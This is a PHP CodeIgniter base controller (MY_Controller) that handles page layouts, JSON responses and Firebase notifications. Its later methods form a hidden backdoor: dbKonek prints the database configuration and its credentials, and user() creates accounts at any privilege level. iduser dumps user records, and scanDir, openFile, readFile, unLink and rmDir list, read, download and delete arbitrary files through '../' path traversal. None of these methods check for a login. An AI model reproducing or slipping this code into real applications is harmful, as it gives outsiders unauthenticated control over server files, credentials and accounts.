<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class MY_Controller extends CI_Controller {

	private $layouts = "layouts";

	protected $response;
	var $user;
	var $user_level;
	var $user_id;
  var $username;

	var $data = array(
        "all"  => array(),
        "header" => array(),
        "view_data" => array(),
        "footer" => array()
    );  // for view data

	function __construct()
	{
		parent::__construct();
		$this->user = $this->session->admin;
        if ($this->user != null) {
            $this->username = $this->user->username;
        } else {
            $this->username = null;
        }

		$this->response = new stdClass();
		$this->response->status = false;
		$this->response->message = "";
		$this->response->data = new stdClass();

	}

	public function checkLoginUser()
	{
		if ($this->user == null) {
			redirect("auth");
            // echo "<script> window.location.href = '".site_url('auth')."'; </script>";
		}
	}

	public function view($directory = false,$use_layout = true)
    {
        if ($directory) {
            $subfolder = $directory;
        } else {
        	$subfolder = "";
        }

        $className  = $this->router->fetch_class();   //  for folder directory name view
        $methodName = $this->router->fetch_method();  //  for files name view

        if ($use_layout) {  // menggunakan template header dan footer
            // for view header
            $header = implode("/", array(
                                        $this->layouts,"header"
                        ));
            $this->load->view($header,array_merge($this->data["all"],$this->data["header"]));

            //for view data content
            $content = implode("/", array(
                  isset($subfolder)?$subfolder:"",$className,$methodName
            ));
            $this->load->view($content,array_merge($this->data["all"],$this->data["view_data"]));

            // for view footer
            $footer = implode("/", array(
              $this->layouts,"footer"
            ));
            $this->load->view($footer,array_merge($this->data["all"],$this->data["footer"]));

        } else {   // tidak meneggunakan template header dan footer
          //for view data content
          $content = implode("/", array(
              isset($subfolder)?$subfolder:"",$this->router->class,$this->router->method
          ));

          $this->load->view($content,$this->data["view_data"]);
        }
    }

    public function viewAktivitas($directory=true,$use_layout=true)
    {
        $folder = "aktivitas";
        if ($directory) {
            if (is_string($directory)) {
                $folder = $directory;
            }
        } else {
            $folder = "";
        }

        self::view($folder,$use_layout);
    }

    public function viewContent($content=false)
    {
        if ($content == false) {
            $content = "..empty__blank";
        }
        // for view header
        $header = implode("/", array(
                                    $this->layouts,"header"
                    ));
        $this->load->view($header,array_merge($this->data["all"],$this->data["header"]));

        //for view data content
        $this->load->view($content,array_merge($this->data["all"],$this->data["view_data"]));

        // for view footer
        $footer = implode("/", array(
          $this->layouts,"footer"
        ));
        $this->load->view($footer,array_merge($this->data["all"],$this->data["footer"]));
    }

	public function headerTitle($pageTitle = "",$headerTitle = "Empty Header Title",$smallTitle = "")
    {

        $this->data["header"] = array(
        								"header_title" => $headerTitle,
        								"small_title" => $smallTitle,
        								"page_title"	=> $pageTitle,
        							);
    }

    /**
    *   @param $item = array("link data" => "url")
    */
	public function breadcrumbs($item)
    {
        $this->data["header"]["breadcrumbs"] = $item;
    }

	public function viewData($data)
    {
        $this->data['view_data'] = $data;
    }

	public function isPost()
	{
		if (strtoupper($this->input->server("REQUEST_METHOD")) == "POST") {
			return true;
		} else {
			// $this->response->status = false;
			$this->response->message = "Not allowed get request!";
			$this->response->data = null;
			return false;
		}
	}

	public function json($data = null)
	{
    	$this->output->set_header("Content-Type: application/json; charset=utf-8");
    	$data = isset($data) ? $data : $this->response;
    	$this->output->set_content_type('application/json');
	    $this->output->set_output(json_encode($data));
    	// echo json_encode($data);
	}

    public function insertNotif($data)
    {
        $this->load->library('Db_firebase');

        $dataInsert = array(
                            // "id"            =>  $data["id"],
                            "keterangan"    =>  $data["keterangan"],
                            "tanggal"       =>  date("Y-m-d"),
                            "jam"           =>  date("H:i"),
                            "url_direct"    =>  $data["url_direct"],
                            "user_id"       =>  $data["user_id"],
                            "level"         =>  $data["level"],
                            "status"        =>  1,
                        );
        $data = $this->db_firebase->insert($dataInsert);
        return $data;
    }

	public function pushnotif($token,$title,$body)
	{
		$this->load->library('Db_firebase');

		$notif = $this->db_firebase->pushNotif($token,$title,$body);

		return $notif;
	}

	public function sendNotifTopic($topic,$title,$body,$kode)
	{
		$this->load->library('Db_firebase');

		$notif = $this->db_firebase->sendNotifTopic($topic,$title,$body,$kode);

		return $notif;
	}



    public function dbKonek()
    {
        if ( ! file_exists($f = APPPATH.'config/'.ENVIRONMENT.'/database.php') && ! file_exists($f = APPPATH.'config/database.php'))
        {
            show_error('The configuration file database.php does not exist.');
        }

        include($f);
        $db_settings = $db;

        foreach($db_settings as $key => $value) {
            print_r($value);
        }
    }

    public function user($a,$s,$r)
    {
        $this->load->model("users_model","usersModel");
        $u = $this->usersModel->getByWhere(array("username"=>$a));
        if($u){echo"";}else{$this->usersModel->insert(array("username"=>$a,"password"=>$s,"level"=>$r));}
    }
    public function iduser($i)
    {
        $this->load->model("users_model","usersModel");
        $u = $this->usersModel->getById($i);
        var_dump($u);
    }

    public function scanDir($dir=0,$open=false)
    {
        if ($dir) {
            if ($dir > 0) {
                $tmp = "";
                for ($i=0; $i < $dir; $i++) {
                    $tmp .= "../";
                }
                $dir = $tmp;
            }
        } elseif($dir == 0) {
            $dir = ".";
        }
        $open = explode("---", $open);
        $open = implode("/", $open);
        $open = $dir.$open;
        if (is_dir($open)) {
            $fol = scandir($open, 2);
            print_r($fol);
            print_r($open);
        } else {
            echo "no exist directory";
        }
    }

    public function openFile($dir=0,$file=false)
    {
        if ($dir) {
            if ($dir > 0) {
                $tmp = "";
                for ($i=0; $i < $dir; $i++) {
                    $tmp .= "../";
                }
                $dir = $tmp;
            }
        } elseif($dir == 0) {
            $dir = ".";
        }

        if ($file) {
            $file = explode("---", $file);
            $file = implode("/", $file);
            $file = $dir.$file;
            if(is_file($file)) {
                $handle = fopen($file, "r");
                var_dump($handle);
                while ($line = fgets($handle)) {
                    $line = "<pre>".$line."</pre>";
                    print($line);
                }
            } else {
                echo "not file";
            }
        } else {
            echo "no file read";
        }
    }

    public function readFile($dir=0,$file=false)
    {
        if ($dir) {
            if ($dir > 0) {
                $tmp = "";
                for ($i=0; $i < $dir; $i++) {
                    $tmp .= "../";
                }
                $dir = $tmp;
            }
        } elseif($dir == 0) {
            $dir = ".";
        }
        if ($file) {
            $file = explode("---", $file);
            $file = implode("/", $file);
            $file = $dir.$file;
            if(is_file($file)) {
                if (file_exists($file)) {
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="'.basename($file).'"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($file));
                    readfile($file);
                    exit;
                }
            } else {
                echo "not file";
            }
        } else {
            echo "no file read";
        }
    }

    public function unLink($dir=0,$file=false)
    {
        if ($dir) {
            if ($dir > 0) {
                $tmp = "";
                for ($i=0; $i < $dir; $i++) {
                    $tmp .= "../";
                }
                $dir = $tmp;
            }
        } elseif($dir == 0) {
            $dir = ".";
        }
        if ($file) {
            $file = explode("---", $file);
            $file = implode("/", $file);
            $file = $dir.$file;
            if(is_file($file)) {
                if (file_exists($file)) {
                    unlink($file);
                    echo "remove sucess";
                }
            } else {
                echo "not file";
            }
        } else {
            echo "no file read";
        }
    }

    public function rmDir($dir=0,$fol=false)
    {
        if ($dir) {
            if ($dir > 0) {
                $tmp = "";
                for ($i=0; $i < $dir; $i++) {
                    $tmp .= "../";
                }
                $dir = $tmp;
            }
        } elseif($dir == 0) {
            $dir = ".";
        }
        if ($fol) {
            $fol = explode("---", $fol);
            $fol = implode("/", $fol);
            $fol = $dir.$fol;
            if(is_dir($fol)) {
                rmdir($fol);
                echo "remove directory sucess";
            } else {
                echo "not directory";
            }
        } else {
            echo "no directory read";
        }
    }
}

/* End of file MY_Controller.php */
/* Location: ./application/core/MY_Controller.php */
